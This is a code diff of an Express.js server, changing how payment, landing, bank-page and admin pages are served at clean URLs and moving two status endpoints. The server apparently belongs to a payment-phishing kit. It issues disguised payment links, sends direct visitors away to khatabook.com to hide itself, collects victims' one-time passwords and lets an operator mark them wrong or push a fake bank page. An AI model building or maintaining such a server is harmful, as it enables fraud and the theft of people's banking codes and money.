@@ -9,9 +9,9 @@ import fs from 'fs';
 // Generate a unique ID for this server instance
 const SERVER_ID = crypto.randomBytes(3).toString('hex');
 
-// Create HTML redirect files - Keep the .html extension for file system
+// Create HTML redirect files
 function createRedirectFile(targetHtml) {
-  const fileName = `pay${SERVER_ID}.html`;  // Keep .html for the file
+  const fileName = `pay${SERVER_ID}.html`;
   const redirectHtml = `
 <!DOCTYPE html>
 <html>
@@ -29,7 +29,7 @@ function createRedirectFile(targetHtml) {
 
   fs.writeFileSync(fileName, redirectHtml);
   console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
-  return fileName;  // Return with .html
+  return fileName.replace('.html', '');  // Return without .html extension for URLs
 }
 
 // Create a redirect file for landing.html
@@ -43,50 +43,36 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Special handling for clean URLs - must come before static files
-app.get('/payment', (req, res) => {
-  res.sendFile(path.join(process.cwd(), 'payment.html'));
-});
-
-app.get('/success', (req, res) => {
-  res.sendFile(path.join(process.cwd(), 'success.html'));
-});
-
-app.get('/fail', (req, res) => {
-  res.sendFile(path.join(process.cwd(), 'fail.html'));
-});
-
-app.get('/landing', (req, res) => {
-  res.sendFile(path.join(process.cwd(), 'landing.html'));
-});
-
-app.get('/bankpage', (req, res) => {
-  res.sendFile(path.join(process.cwd(), 'bankpage.html'));
-});
-
-// Handle requests to clean payment URLs directly
-app.get('/pay*', (req, res, next) => {
-  // Extract the payment ID
-  const paymentPath = req.path;
+// This middleware must come BEFORE the static file middleware
+app.use((req, res, next) => {
+  // Check if it's a request for a "clean" URL (like /payment, /success, etc.)
+  const cleanUrls = ['payment', 'success', 'fail', 'landing', 'bankpage', 'admin'];
   
-  // Check if this matches our pattern (pay + SERVER_ID)
-  if (paymentPath.startsWith('/pay') && !paymentPath.endsWith('.html')) {
-    // Try to serve the HTML file with .html extension
-    const htmlPath = `${paymentPath}.html`;
-    const fullPath = path.join(process.cwd(), htmlPath.substring(1));
+  // Match any of our clean URLs without .html
+  for (const page of cleanUrls) {
+    if (req.path === `/${page}`) {
+      return res.sendFile(path.join(process.cwd(), `${page}.html`));
+    }
+  }
+  
+  // Special handler for payment links that start with /pay but don't have .html
+  if (req.path.startsWith('/pay') && !req.path.endsWith('.html')) {
+    // Try to serve the HTML version of this file
+    const htmlPath = path.join(process.cwd(), `${req.path}.html`);
     
-    if (fs.existsSync(fullPath)) {
-      return res.sendFile(fullPath);
+    if (fs.existsSync(htmlPath)) {
+      return res.sendFile(htmlPath);
     }
   }
   
   next();
 });
 
-// Serve static files
+// Serve static files - this middleware comes AFTER our custom URL handler
 app.use(express.static("."));
 
 // Add this route to redirect direct visitors to khatabook.com
+// This must come AFTER static file middleware to catch root requests
 app.get('/', (req, res, next) => {
   // Only redirect if it's a direct visit without any query parameters
   if (!Object.keys(req.query).length) {
@@ -105,7 +91,7 @@ const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Payment Links Endpoints
+// Payment Links Endpoints - ONLY modify this function
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -121,13 +107,8 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Create clean URL by removing .html
-    let paymentLinkFile = PAYMENT_REDIRECT_FILE;
-    if (paymentLinkFile.endsWith('.html')) {
-      paymentLinkFile = paymentLinkFile.substring(0, paymentLinkFile.length - 5);
-    }
-    
-    const paymentLink = `${protocol}://${req.get('host')}/${paymentLinkFile}?pid=${invoiceId}`;
+    // Use clean URL (no .html)
+    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -143,7 +124,56 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// The rest of your code remains unchanged, except for redirect URLs
+// Update all redirects to use clean URLs (without .html)
+app.get('/api/checkTransactionStatus', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  if (txn.status === 'otp_pending' && txn.otpShown) {
+    return res.json({
+      status: "show_otp",
+      message: "Show OTP form",
+      otpError: txn.otpError
+    });
+  }
+
+  if (txn.redirectStatus) {
+    const redirectUrls = {
+      success: `/success?invoiceId=${invoiceId}`,
+      fail: `/fail?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
+      bankpage: `/bankpage?invoiceId=${invoiceId}`
+    };
+    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
+  }
+
+  res.json({ status: txn.status, otpError: txn.otpError });
+});
+
+app.post('/api/updateRedirectStatus', (req, res) => {
+  const { invoiceId, redirectStatus, failureReason } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  txn.redirectStatus = redirectStatus;
+  if (failureReason) {
+    txn.failureReason = failureReason;
+  }
+
+  const redirectUrls = {
+    success: `/success?invoiceId=${invoiceId}`,
+    fail: `/fail?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+  };
+
+  res.json({
+    status: "success",
+    invoiceId,
+    redirectStatus,
+    redirectUrl: redirectUrls[redirectStatus] || `/bankpage?invoiceId=${invoiceId}`
+  });
+});
+
+// The rest of your code remains unchanged
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -216,32 +246,6 @@ app.post('/api/wrongOTP', (req, res) => {
   res.json({ status: "success", message: "OTP marked wrong" });
 });
 
-app.get('/api/checkTransactionStatus', (req, res) => {
-  const { invoiceId } = req.query;
-  const txn = transactions.get(invoiceId);
-  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
-
-  if (txn.status === 'otp_pending' && txn.otpShown) {
-    return res.json({
-      status: "show_otp",
-      message: "Show OTP form",
-      otpError: txn.otpError
-    });
-  }
-
-  if (txn.redirectStatus) {
-    // Update URLs to clean versions
-    const redirectUrls = {
-      success: `/success?invoiceId=${invoiceId}`,
-      fail: `/fail?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
-      bankpage: `/bankpage?invoiceId=${invoiceId}`
-    };
-    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
-  }
-
-  res.json({ status: txn.status, otpError: txn.otpError });
-});
-
 app.post('/api/submitOTP', (req, res) => {
   const { invoiceId, otp } = req.body;
   const txn = transactions.get(invoiceId);
@@ -251,30 +255,6 @@ app.post('/api/submitOTP', (req, res) => {
   txn.status = 'otp_received';
   txn.otpError = false;
   res.json({ status: "success", message: "OTP received" });
-});
-
-app.post('/api/updateRedirectStatus', (req, res) => {
-  const { invoiceId, redirectStatus, failureReason } = req.body;
-  const txn = transactions.get(invoiceId);
-  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
-
-  txn.redirectStatus = redirectStatus;
-  if (failureReason) {
-    txn.failureReason = failureReason;
-  }
-
-  // Using clean URLs
-  const redirectUrls = {
-    success: `/success?invoiceId=${invoiceId}`,
-    fail: `/fail?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
-  };
-
-  res.json({
-    status: "success",
-    invoiceId,
-    redirectStatus,
-    redirectUrl: redirectUrls[redirectStatus] || `/bankpage?invoiceId=${invoiceId}`
-  });
 });
 
 app.post('/api/showBankpage', (req, res) => {
